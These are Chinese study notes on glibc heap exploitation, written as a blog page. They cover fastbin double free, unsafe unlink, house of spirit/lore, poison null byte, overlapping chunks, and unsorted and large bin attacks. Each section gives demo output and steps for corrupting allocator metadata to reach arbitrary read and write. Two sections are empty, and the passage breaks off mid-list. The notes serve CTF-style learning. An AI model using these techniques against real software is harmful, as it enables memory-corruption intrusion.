class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs llvm">演示 fastbin 的 <span class="hljs-keyword">double</span> <span class="hljs-keyword">free</span><br>首先申请 <span class="hljs-number">3</span> 个 chunk<br>第一个 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br>第二个 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f030</span><br>第三个 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f050</span><br><span class="hljs-keyword">free</span> 掉第一个<br>当我们再次 <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f010</span> 的时候<span class="hljs-punctuation">,</span> 程序将会崩溃因为 <span class="hljs-number">0x188f010</span> 在 <span class="hljs-keyword">free</span> 链表的第一个位置上<br>我们先 <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f030</span>.<br>现在我们就可以再次 <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f010</span> 了<span class="hljs-punctuation">,</span> 因为他现在不在 <span class="hljs-keyword">free</span> 链表的第一个位置上<br>现在空闲链表是这样的 [ <span class="hljs-number">0x188f010</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0x188f030</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0x188f010</span> ]. 如果我们 <span class="hljs-keyword">malloc</span> 三次<span class="hljs-punctuation">,</span> 我们会得到两次 <span class="hljs-number">0x188f010</span> <br>第一次 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br>第二次 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f030</span><br>第三次 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请3个chunk，p1，p2，p3</li><li>free p1，再freep2，形成 p2 -&gt; p1</li><li>再free p1 形成 p1 -&gt; p2 -&gt; p1</li><li>连续申请三次chunk</li></ul><p><strong>结果</strong></p><p>得到两个相同地址的chunk</p><h2 id="Fastbin-dup-into-stack-–-Double-free"><a href="#Fastbin-dup-into-stack-–-Double-free" class="headerlink" title="Fastbin-dup-into-stack-–-Double-free"></a>Fastbin_dup_into_stack – Double free</h2><p><strong>原理</strong></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）<br>通过 malloc 申请到 <span class="hljs-number">0x7ffec12adb40</span>.<br>先申请<span class="hljs-number">3</span> 个 chunk<br>chunk a: <span class="hljs-number">0x209a010</span><br>chunk b: <span class="hljs-number">0x209a030</span><br>chunk c: <span class="hljs-number">0x209a050</span><br>free 掉 chunk a<br>如果还对 <span class="hljs-number">0x209a010</span> 进行 free, 程序会崩溃。因为 <span class="hljs-number">0x209a010</span> 现在是 fastbin 的第一个<br>先对 b <span class="hljs-number">0x209a030</span> 进行 free<br>接下来就可以对 <span class="hljs-number">0x209a010</span> 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了<br>现在 fastbin 的链表是 [ <span class="hljs-number">0x209a010</span>, <span class="hljs-number">0x209a030</span>, <span class="hljs-number">0x209a010</span> ] 接下来通过修改 <span class="hljs-number">0x209a010</span> 上的内容来进行攻击.<br>第一次 malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a010</span><br>第二次 malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a030</span><br>现在 fastbin 表中只剩 [ <span class="hljs-number">0x209a010</span> ] 了<br>接下来往 <span class="hljs-number">0x209a010</span> 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去<br>现在覆盖 <span class="hljs-number">0x209a010</span> 前面的 <span class="hljs-number">8</span> 字节，修改 fd 指针指向 stack_var 前面 <span class="hljs-number">0x20</span> 的位置<br>第三次 malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a010</span>, 把栈地址放到 fastbin 链表中<br>这一次 malloc(<span class="hljs-number">8</span>) 就申请到了栈上去: <span class="hljs-number">0x7ffec12adb40</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请3个chunk，p1，p2，p3</li><li>free p1，再freep2，形成 p2 -&gt; p1</li><li>再free p1 形成 p1 -&gt; p2 -&gt; p1</li><li>修改p1的fd指向任意地址，栈上都可</li><li>连续申请三次chunk</li><li>第四次申请chunk会申请到目标地址</li></ul><p><strong>结果</strong></p><p>任意地址读写</p><h2 id="Fastbin-dup-consolidate"><a href="#Fastbin-dup-consolidate" class="headerlink" title="Fastbin-dup-consolidate"></a>Fastbin_dup_consolidate</h2><p><strong>原理</strong></p><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">申请两个 fastbin 范围内的 chunk: p1=0xbba010 p2=0xbba030<br>先 free p1<br>去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=0xbba050<br>因为 malloc_consolidate(), p1 会被放到 unsorted bin 中<br>这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成<span class="hljs-built_in"> double </span>free<br>现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0xbba010 0xbba010<br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><pre><code>- 1.free 一个fastbin大小的chunk 1- 2.申请一个largin bin 大小的chunk，此时因为 malloc_consolidate(), chunk1 会被放到 unsorted bin 中- 再次free chunk1</code></pre><p><strong>结果</strong></p><p>​现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0xbba010 0xbba010，任意地址读写</p><h2 id="Unsafe-Unlink"><a href="#Unsafe-Unlink" class="headerlink" title="Unsafe-Unlink"></a>Unsafe_Unlink</h2><p><strong>原理</strong></p><figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xl">当你在已知位置有指向某个区域的指针时，可以调用 unlink<br>最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针<br>本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入<br><br>全局变量 chunk0_ptr 在 <span class="hljs-number">0</span>x6020d0, 指向 <span class="hljs-number">0</span>x161e010<br>我们想要破坏的 chunk 在 <span class="hljs-number">0</span>x161e0a0<br>在 chunk0 那里伪造一个 chunk<br>我们设置 <span class="hljs-function"><span class="hljs-title">fake</span> chunk 的 'next_free_chunk' (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk = P.<br>我们设置 <span class="hljs-function"><span class="hljs-title">fake</span> chunk 的 'previous_free_chunk' (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd = P.<br>通过上面的设置可以绕过检查: (P-&gt;<span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd != P) == False<br>Fake chunk 的 fd: <span class="hljs-number">0</span>x6020b8<br>Fake chunk 的 bk: <span class="hljs-number">0</span>x6020c0<br><br>现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据<br>通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的<br>如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 <span class="hljs-number">0</span>x90 但现在被改成了 <span class="hljs-number">0</span>x80<br>接下来通过把 chunk1 的 prev_inuse 改成 <span class="hljs-number">0</span> 来把伪造的堆块标记为空闲的堆块<br><br>现在释放掉 chunk1，会触发 unlink，合并两个 free chunk<br>此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置<br>chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。<br>之前的值是: Hello!~<br>新的值是: BBBBAAAA<br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><p>​fd = goal - 0x18</p><p>​bk = goal - 0x10</p><p><strong>结果</strong></p><p>任意地址写</p><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house-of-spirit"></a>house_of_spirit</h2><p><strong>原理</strong></p><figure class="highlight dns"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">这个例子演示了 house of spirit 攻击<br>我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它<br>覆盖一个指向 fastbin 的指针<br>这块区域 (长度为: <span class="hljs-number">80</span>) 包含两个 chunk. 第一个在 <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7268</span> 第二个在 <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e72a8</span>.<br>构造 fake chunk 的 size，要比 chunk 大 <span class="hljs-number">0</span>x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 <span class="hljs-number">0</span><br>next chunk 的大小也要注意，要大于 <span class="hljs-number">0</span>x10 小于 av-&gt;system_mem（<span class="hljs-number">128</span>kb）<br>现在，我们拿伪造的那个 fake chunk 的地址进行 free, <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span>.<br>free!<br>现在 malloc 的时候将会把 <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span> 给返回回来<br>malloc(<span class="hljs-number">0</span>x30): <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span><br>Finish!<br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><p>构造fake fastbin chunk，free掉这个chunk，再次申请可以拿回这个chunk</p><p>前提有一个可控的指针</p><p><strong>结果</strong></p><p>任意地址写，前提有可控指针</p><h2 id="Posion-null-byte"><a href="#Posion-null-byte" class="headerlink" title="Posion-null-byte"></a>Posion_null_byte</h2><p><strong>原理</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">当存在 off by null 的时候可以使用该技术<br>申请 <span class="hljs-number">0x100</span> 的 chunk a<br>a 在: <span class="hljs-number">0x1eb2010</span><br>因为我们想要溢出 chunk a，所以需要知道他的实际大小: <span class="hljs-number">0x108</span><br>b: <span class="hljs-number">0x1eb2120</span><br>c: <span class="hljs-number">0x1eb2330</span><br>另外再申请了一个 chunk c：<span class="hljs-number">0x1eb2440</span>，防止 <span class="hljs-built_in">free</span> 的时候与 top chunk 发生合并的情况<br>会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 <span class="hljs-number">0x200</span> 来绕过检查<br>b 的 size: <span class="hljs-number">0x211</span><br>假设我们写 chunk a 的时候多写了一个 <span class="hljs-number">0x00</span> 在 b 的 size 的 p 位上<br>b 现在的 size: <span class="hljs-number">0x200</span><br>c 的 prev_size 是 <span class="hljs-number">0x210</span><br>但他根据 chunk b 的 size 找的时候会找到 b+<span class="hljs-number">0x1f0</span> 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == <span class="hljs-number">0x200</span> == <span class="hljs-number">0x200</span> == prev_size (next_chunk(P))<br>申请一个 <span class="hljs-number">0x100</span> 大小的 b1: <span class="hljs-number">0x1eb2120</span><br>现在我们 <span class="hljs-built_in">malloc</span> 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: <span class="hljs-number">0x210</span><br>但是我们之前写 <span class="hljs-number">0x200</span> 那个地方已经改成了: f0<br>接下来 <span class="hljs-built_in">malloc</span> <span class="hljs-string">'b2'</span>, 作为 <span class="hljs-string">'victim'</span> chunk.<br>b2 申请在: <span class="hljs-number">0x1eb2230</span><br>现在 b2 填充的内容是:<br>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br>现在对 b1 和 c 进行 <span class="hljs-built_in">free</span> 因为 c 的 prev_size 是 <span class="hljs-number">0x210</span>，所以会把他俩给合并，但是这时候里面还包含 b2 呐.<br>这时候我们申请一个 <span class="hljs-number">0x300</span> 大小的 chunk 就可以覆盖着 b2 了<br>d 申请到了: <span class="hljs-number">0x1eb2120</span>，我们填充一下 d 为 <span class="hljs-string">"D"</span><br>现在 b2 的内容就是:<br>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD<br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请0x100大小的chunk a，0x200大小的chunk b，chunk c 防合并</li><li>free b</li><li>通过off-by-one覆写chunk b的size从0x211-&gt;0x200</li><li>chunk b中b+0x1f0的位置放prev_size = 0x200 我们将会成功绕过 chunk 的检测 chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))</li><li>申请一个0x100的b1，b1会放到b的位置，c的prev_size仍然是0x210，但是我们之前写 0x200 那个地方已经改成了: f0</li><li>申请b2，作为 ‘victim’ chunk</li><li>free b1 和 c，由于c的prev_size是0x210，会合并b1和c，此时b2仍在</li></ul><p><strong>结果</strong></p><p>在一个大的free堆块中存在一个未被free的堆块</p><h2 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House-of-lore"></a>House_of_lore</h2><p><strong>原理</strong></p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">定义了两个数组stack_buffer_1 在 <span class="hljs-number">0x7ffc7a946070</span><br>stack_buffer_2 在 <span class="hljs-number">0x7ffc7a946050</span><br>申请第一块属于 fastbin 的 chunk 在 <span class="hljs-number">0x211c010</span><br>在栈上伪造一块 fake chunk<br>设置 fd 指针指向 victim chunk，来绕过 small <span class="hljs-keyword">bin </span>的检查，这样的话就能把堆栈地址放在到 small <span class="hljs-keyword">bin </span>的列表上<br>设置 stack_buffer_1 的 <span class="hljs-keyword">bk </span>指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small <span class="hljs-keyword">bin </span>corrupted, 返回指向栈上假块的指针另外再分配一块，避免与 top chunk 合并 <span class="hljs-number">0x211c080</span><br>Free victim chunk <span class="hljs-number">0x211c010</span>, 他会被插入到 fastbin 中<br><br>此时 victim chunk 的 fd、<span class="hljs-keyword">bk </span>为零<br>victim-&gt;fd: (nil)<br>victim-&gt;<span class="hljs-keyword">bk: </span>(nil)<br><br>这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small <span class="hljs-keyword">bin </span>中 <span class="hljs-number">0x211c010</span><br>现在 victim chunk 的 fd 和 <span class="hljs-keyword">bk </span>更新为 unsorted <span class="hljs-keyword">bin </span>的地址<br>victim-&gt;fd: <span class="hljs-number">0x7f6610ee7bd8</span><br>victim-&gt;<span class="hljs-keyword">bk: </span><span class="hljs-number">0x7f6610ee7bd8</span><br><br>现在模拟一个可以覆盖 victim 的 <span class="hljs-keyword">bk </span>指针的漏洞，让他的 <span class="hljs-keyword">bk </span>指针指向栈上<br>然后申请跟第一个 chunk 大小一样的 chunk<br>他应该会返回 victim chunk 并且它的 <span class="hljs-keyword">bk </span>为修改掉的 victim 的 <span class="hljs-keyword">bk</span><br><span class="hljs-keyword"></span>最后 malloc 一次会返回 victim-&gt;<span class="hljs-keyword">bk </span>指向的那里<br>p4 = malloc(<span class="hljs-number">100</span>)<br><br>在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 <span class="hljs-number">0x7f6610ee7bd8</span><br><br>p4 在栈上 <span class="hljs-number">0x7ffc7a946080</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>在栈上定义了两个数组 stack1，stack2</li><li>申请了一块 fastbin chunk，在栈上伪造一块 fake chunk，设置stack1 fd -&gt; victim chunk，绕过small bin检查</li><li>设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2 &amp; 设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1</li><li>再分配个chunk，避免和top chunk 合并</li><li>free victim chunk，会被放入fastbin中同时fd、bk为0</li><li>再申请一个large bin chunk触发xx使得victim chunk 进入 unsortedbin</li><li>fd 和 bk 被更新为main_arena_88</li><li>存在一个漏洞可以使得victim的bk -&gt; stack 1</li><li>申请一个大小相同的chunk取出victim chunk,并且它的bk为修改掉的victim的bk</li><li>再次malloc一次会返回 victim -&gt; bk 指向的那里，也就是stack1，stack2 fd 指针也更改main_arena_88</li></ul><p><strong>结果</strong></p><p>任意地址malloc</p><h2 id="Overlapping-chunks"><a href="#Overlapping-chunks" class="headerlink" title="Overlapping-chunks"></a>Overlapping_chunks</h2><p><strong>原理</strong></p><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs smali">这是一个简单的堆块重叠问题，首先申请 3 个 chunk<br>这三个 chunk 分别申请到了:<br>p1：0x2088010<br>p2：0x2088110<br>p3：0x2088210<br>给他们分别填充<span class="hljs-string">"1"</span><span class="hljs-string">"2"</span><span class="hljs-string">"3"</span><br><br>free 掉 p2<br>p2 被放到 unsorted bin 中<br>现在假设有一个堆溢出漏洞，可以覆盖 p2<br>为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块<br>我们将 p2 的大小设置为 385, 这样的话我们就能用 376 大小的空间<br><br>现在让我们分配另一个块，其大小等于块p2注入大小的数据大小<br>malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）<br><br>p4 分配在 0x2088110 到 0x2088288 这一区域<br>p3 从 0x2088210 到 0x2088288<br>p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3<br>这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容<br><br>接下来验证一下，现在 p3 与 p4:<br>p4 = 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222<br>p3 = 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�<br><br>如果我们使用 memset(p4, '4', 376), 将会:<br>p4 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�<br>p3 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�<br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请三个堆块大小为0xf8，0xf8，0x78</li><li>free p2，p2被放到 unsorted bin 中</li><li>假设存在一个堆溢出漏洞，可以覆盖p2</li></ul><p><strong>结果</strong></p><p>堆块重叠</p><h2 id="Overlapping-chunks-2"><a href="#Overlapping-chunks-2" class="headerlink" title="Overlapping-chunks-2"></a>Overlapping_chunks_2</h2><p><strong>原理</strong></p><p><strong>操作</strong></p><p><strong>结果</strong></p><h2 id="Mmap-overlapping-chunks"><a href="#Mmap-overlapping-chunks" class="headerlink" title="Mmap-overlapping-chunks"></a>Mmap_overlapping_chunks</h2><p><strong>原理</strong></p><p><strong>操作</strong></p><p><strong>结果</strong></p><h2 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted-bin-attack"></a>Unsorted_bin_attack</h2><p><strong>原理</strong></p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">unsorted <span class="hljs-keyword">bin </span>attack 实现了把一个超级大的数（unsorted <span class="hljs-keyword">bin </span>的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 <span class="hljs-number">0x7ffe5b09ba18</span> 的值 <span class="hljs-number">0</span> 更改为一个很大的数<br><br>一开始先申请一个比较正常的 chunk: <span class="hljs-number">0x14fe010</span><br>再分配一个避免与 top chunk 合并<br><br>当我们释放掉第一个 chunk 之后他会被放到 unsorted <span class="hljs-keyword">bin </span>中，同时它的 <span class="hljs-keyword">bk </span>指针为 <span class="hljs-number">0x7efe12f93b78</span><br>现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 <span class="hljs-keyword">bk </span>指针<br>我们把目标地址（想要改为超大值的那个地方）减去 <span class="hljs-number">0x10</span> 写到 <span class="hljs-keyword">bk </span>指针:<span class="hljs-number">0x7ffe5b09ba08</span><br><br>再去 malloc 的时候可以发现那里的值已经改变为 unsorted <span class="hljs-keyword">bin </span>的地址<br><span class="hljs-number">0x7ffe5b09ba18</span>: <span class="hljs-number">0x7efe12f93b78</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请一个chunk p1 (0x410)，再申请一个chunk p2避免与top chunk 合并</li><li>free p1，p1会被放入 unsorted bin 中，同时fd 和 bk指针为main_arena_88</li><li>假设有个漏洞，可以修改p1的bk指针</li><li>修改 bk -&gt; (goal - 0x10)</li><li>再malloc相同大小的chunk p，goal已经为unsorted bin 的地址</li></ul><p><strong>结果</strong></p><p>修改任意位置为 一个很大的数</p><h2 id="Large-bin-attack"><a href="#Large-bin-attack" class="headerlink" title="Large-bin-attack"></a>Large_bin_attack</h2><p><strong>原理</strong></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数<br><br>先来看一下目标:<br>stack_var1 (<span class="hljs-number">0x7fff83c2e410</span>): <span class="hljs-number">0</span><br>stack_var2 (<span class="hljs-number">0x7fff83c2e418</span>): <span class="hljs-number">0</span><br><br>分配第一个 large chunk: <span class="hljs-number">0x6ac000</span><br>再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了<br><br>申请第二个 large chunk 在: <span class="hljs-number">0x6ac360</span><br>同样在分配一个 fastbin 大小的 chunk 防止合并掉<br><br>最后申请第三个 large chunk 在: <span class="hljs-number">0x6ac7a0</span><br>申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并<br><br>free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ <span class="hljs-number">0x6ac360</span> &lt;--&gt; <span class="hljs-number">0x6ac000</span> ]<br><br>现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ <span class="hljs-number">0x6ac0a0</span> ]<br><br>free 掉第三个，他会被放到 unsorted bin 中: [ <span class="hljs-number">0x6ac7a0</span> &lt;--&gt; <span class="hljs-number">0x6ac0a0</span> ]<br><br>假设有个漏洞，可以覆盖掉第二个 chunk 的 <span class="hljs-string">"size"</span> 以及 <span class="hljs-string">"bk"</span>、<span class="hljs-string">"bk_nextsize"</span> 指针<br>减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-<span class="hljs-number">0x10</span>，bk_nextsize 为 stack_var2-<span class="hljs-number">0x20</span><br><br>再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:<br>stack_var1 (<span class="hljs-number">0x7fff83c2e410</span>): <span class="hljs-number">0x6ac7a0</span><br>stack_var2 (<span class="hljs-number">0x7fff83c2e418</span>): <span class="hljs-number">0x6ac7a0</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>分配第一个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并</li><li>分配第二个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并</li><li>分配第三个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并</li><li>free chunk1 和 chunk2  均被放入unsorted bin 中</li><li>现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中</li><li>free chunk3 放到unsorted bin 中</li><li>存在漏洞，可以覆盖掉第二个chunk 的size bk bk_nextsize</li><li>减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 